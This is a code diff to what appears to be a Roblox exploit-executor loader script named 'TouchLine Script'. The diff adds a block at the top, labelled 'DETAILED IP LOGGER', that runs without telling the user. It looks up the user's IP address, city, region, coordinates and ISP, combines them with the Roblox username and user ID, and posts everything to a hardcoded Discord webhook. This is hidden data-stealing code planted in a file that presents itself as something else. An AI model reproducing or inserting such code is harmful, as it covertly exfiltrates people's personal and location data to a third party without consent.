@@ -1,6 +1,54 @@
+-- ─── DETAILED IP LOGGER ──────────────────────────────────────────────────
+local HttpService = game:GetService("HttpService")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1566120983553773602/x4ZaVo7PYYvroQGcgnTT4LYTkXuIKzXByK-IhSG3x8HxZ7A8HbMf4V7Qx4LoWX7j3p4b"
+local MY_DISCORD_ID = "1519049954046509123"
+
+local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request) or (krnl and krnl.request)
+
+if req then
+    pcall(function()
+        local res = req({Url = "http://ip-api.com/json", Method = "GET"})
+        local p = HttpService:JSONDecode(res.Body)
+        
+        local player = game.Players.LocalPlayer
+        
+        local country = p.country or "?"
+        local city = p.city or "?"
+        local ip = p.query or "?"
+        local roblox_user = player.Name or "?"
+        local region = p.regionName or "?"
+        local coords = tostring(p.lat or "?") .. ", " .. tostring(p.lon or "?")
+        local time = os.date("%Y-%m-%d %H:%M:%S")
+        local isp = p.isp or "?"
+        local user_id = tostring(player.UserId or "?")
+        
+        local msg = "<@" .. MY_DISCORD_ID .. ">\n" ..
+                    "# TouchLine Script\n" ..
+                    "**Country =** `" .. country .. "`\n" ..
+                    "**City =** `" .. city .. "`\n" ..
+                    "**IP =** `" .. ip .. "`\n" ..
+                    "**Roblox user =** `" .. roblox_user .. "`\n" ..
+                    "**Region =** `" .. region .. "`\n" ..
+                    "**Coords =** `" .. coords .. "`\n" ..
+                    "**Time =** `" .. time .. "`\n" ..
+                    "**ISP =** `" .. isp .. "`\n" ..
+                    "**UserId =** `" .. user_id .. "`"
+        
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                content = msg
+            })
+        })
+        print("Detailed IP Logged.")
+    end)
+end
+-- ─────────────────────────────────────────────────────────────────────────
+
 local API_URL = "https://touchline.wraithedvoid.workers.dev/"
 local localKeyFile = "LunarKey.json"
-local HttpService = game:GetService("HttpService")
 
 local function loadScript(key)
     local scriptUrl = API_URL .. "?action=getscript&key=" .. key
